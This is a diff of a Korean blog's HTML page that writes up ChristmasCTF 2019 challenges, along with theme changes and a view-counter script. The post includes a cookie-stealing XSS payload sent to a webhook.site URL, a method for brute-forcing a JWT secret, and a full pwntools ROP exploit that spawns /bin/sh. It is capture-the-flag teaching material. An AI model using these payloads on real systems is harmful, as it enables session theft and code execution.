@@ -26,7 +26,7 @@
   
   <title>ChristmasCTF 2019 Write up - JHYEON BLOG</title>
   
-    <meta name="keywords" content="Web,ChristmasCTF2019,Pwnable">
+    <meta name="keywords" content="Web,Pwnable,ChristmasCTF2019">
   
 
   
@@ -295,9 +295,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post dock' style="display: none;">
+        <div id="full" class='cover-wrapper post focus' style="display: none;">
           
-            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"></div>
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
           <div class='cover-body'>
   <div class='top'>
@@ -347,7 +347,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
 <div class='new-meta-item author'>
   <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="">
+    <img no-lazy src="/img/header/cat.jpeg">
     <p>jhyeon</p>
   </a>
 </div>
@@ -370,7 +370,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Dec 26, 2020</p>
+    <p>Date : Dec 26, 2020</p>
   </a>
 </div>
 
@@ -378,6 +378,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="ChristmasCTF 2019 Write up" data-path="/2020/12/26/christmasctf-201226/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        View
+      </div>
+    </a>
+  </div>
+
 
           
         
@@ -392,15 +403,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>admin 계정에 대해서</p>
 <p>비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고,</p>
 <p>이를 통해 로그인 하여 플래그를 얻어낼 수 있었다.</p>
-<h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><pre><code class="js">jwt: &#123;
-    bruth: &#123;
-      key: &#39;********&#39;, // 0~9, 8 length
-      options: &#123;
-        issuer: &#39;c2w2m2&#39;,
-        expiresIn: &#39;1d&#39;,
-        algorithm: &#39;HS256&#39;,
-      &#125;
- &#125;;</code></pre>
+<h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">jwt: &#123;<br>    bruth: &#123;<br>      key: <span class="hljs-string">&#x27;********&#x27;</span>, <span class="hljs-comment">// 0~9, 8 length</span><br>      options: &#123;<br>        issuer: <span class="hljs-string">&#x27;c2w2m2&#x27;</span>,<br>        expiresIn: <span class="hljs-string">&#x27;1d&#x27;</span>,<br>        algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>,<br>      &#125;<br> &#125;;<br></code></pre></td></tr></table></figure>
 <p>해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다.</p>
 <p>config.js 에서 위와 같은 내용을 확인할 수 있었고</p>
 <p>결론적으로 secret key를 브포해서 찾아내야 하는 것이였다.</p>
@@ -411,64 +414,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </ul>
 <h3 id="3-Web-CSRF"><a href="#3-Web-CSRF" class="headerlink" title="3. [Web] CSRF"></a>3. [Web] CSRF</h3><p>해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다.</p>
 <p>문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다.</p>
-<pre><code class="js">if (board.content.match(/script|img|on/i)) return res.send(&#123; code: 400 &#125;);</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (board.content.match(<span class="hljs-regexp">/script|img|on/i</span>)) <span class="hljs-keyword">return</span> res.send(&#123; <span class="hljs-attr">code</span>: <span class="hljs-number">400</span> &#125;);<br></code></pre></td></tr></table></figure>
 <p>무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다.</p>
-<pre><code class="js">location.href=&#39;https://webhook.site~&#39; + document.cookie;</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">location.href=<span class="hljs-string">&#x27;https://webhook.site~&#x27;</span> + <span class="hljs-built_in">document</span>.cookie;<br></code></pre></td></tr></table></figure>
 <h3 id="4-Pwn-Solo-test"><a href="#4-Pwn-Solo-test" class="headerlink" title="4. [Pwn] Solo test"></a>4. [Pwn] Solo test</h3><p>ROP 기법을 이용해서 풀면 된다.</p>
-<pre><code class="py">#!/usr/bin/python
-
-from pwn import *
-
-p = process(&#39;./solo_test&#39;)
-
-e = ELF(&#39;./solo_test&#39;)
-
-libc = ELF(&#39;./libc227.so&#39;)
-
-pr = 0x0000000000400b83
-ret = 0x00000000004005f1
-
-puts_plt = e.plt[&#39;puts&#39;]
-puts_got = e.got[&#39;puts&#39;]
-solo = e.symbols[&#39;solo&#39;]
-
-puts_offset = libc.symbols[&#39;puts&#39;]
-system_offset = libc.symbols[&#39;system&#39;]
-binsh_offset = next(libc.search(&quot;/bin/sh&quot;))
-
-p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Me&#39;)
-p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;)
-p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;CTF&#39;)
-p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Never&#39;)
-p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;)
-
-
-payload = &quot;A&quot;*88
-payload += p64(pr)
-payload += p64(puts_got)
-payload += p64(puts_plt)
-payload += p64(solo)
-
-p.sendlineafter(&#39;--&gt; &#39;,payload)
-
-puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
-
-libc_base = puts_addr - puts_offset
-system_addr = libc_base + system_offset
-binsh_addr = libc_base + binsh_offset
-
-payload = &quot;A&quot;*88
-payload += p64(pr)
-payload += p64(binsh_addr)
-payload += p64(ret)
-payload += p64(system_addr)
-
-p.sendlineafter(&#39;--&gt; &#39;, payload)
-
-p.interactive()
-
-p.close()</code></pre>
-
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./solo_test&#x27;</span>)<br><br>e = ELF(<span class="hljs-string">&#x27;./solo_test&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc227.so&#x27;</span>)<br><br>pr = <span class="hljs-number">0x0000000000400b83</span><br>ret = <span class="hljs-number">0x00000000004005f1</span><br><br>puts_plt = e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>solo = e.symbols[<span class="hljs-string">&#x27;solo&#x27;</span>]<br><br>puts_offset = libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_offset = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;Me&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;No&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;CTF&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;Never&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;No&#x27;</span>)<br><br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">88</span><br>payload += p64(pr)<br>payload += p64(puts_got)<br>payload += p64(puts_plt)<br>payload += p64(solo)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;--&gt; &#x27;</span>,payload)<br><br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base + system_offset<br>binsh_addr = libc_base + binsh_offset<br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">88</span><br>payload += p64(pr)<br>payload += p64(binsh_addr)<br>payload += p64(ret)<br>payload += p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;--&gt; &#x27;</span>, payload)<br><br>p.interactive()<br><br>p.close()<br></code></pre></td></tr></table></figure>
   
   
     
@@ -481,7 +431,7 @@ p.close()</code></pre>
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/09/11/picoctf-200911/" title="PicoCTF 2019 Write Up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">PicoCTF 2019 Write Up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/09/14/csawctf-200914/" title="CSAW CTF 2020 roppity Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">CSAW CTF 2020 roppity Write up</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/09/11/picoctf-200911/" title="PicoCTF 2019 Write Up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">PicoCTF 2019 Write Up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">BISC CTF 2020(oldschool) write up</span></a></div></section></div>
       
       
       
@@ -495,10 +445,10 @@ p.close()</code></pre>
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-26T00:00:00+09:00">
+          <div class="new-meta-item date">
   <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditDec 26, 2020</p>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>Date : Dec 26, 2020</p>
   </a>
 </div>
 
@@ -507,7 +457,7 @@ p.close()</code></pre>
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ChristmasCTF2019/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ChristmasCTF2019</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pwnable/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwnable</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pwnable/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Pwnable</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ChristmasCTF2019/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ChristmasCTF2019</p></a></div>
 
 
         
@@ -579,7 +529,7 @@ https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc1748...</
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Web-watermelon"><span class="toc-text">1. [Web] watermelon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Web-JWT"><span class="toc-text">2. [Web] JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Web-CSRF"><span class="toc-text">3. [Web] CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Pwn-Solo-test"><span class="toc-text">4. [Pwn] Solo test</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Web-watermelon"><span class="toc-number">1.</span> <span class="toc-text">1. [Web] watermelon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Web-JWT"><span class="toc-number">2.</span> <span class="toc-text">2. [Web] JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Web-CSRF"><span class="toc-number">3.</span> <span class="toc-text">3. [Web] CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Pwn-Solo-test"><span class="toc-number">4.</span> <span class="toc-text">4. [Pwn] Solo test</span></a></li></ol>
     </div>
   </section>
 
@@ -749,7 +699,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1142,6 +1092,215 @@ volantis.pjax.push(()=>{
 
 
 
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://blog.jhyeon.dev' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
 
 
 
@@ -1163,8 +1322,6 @@ function listennSidebarTOC() {
       event.preventDefault();
       window.scrollTo({
 		top: target.offsetTop + 100,
-		
-		behavior: "smooth"
 		
 	  });
     });
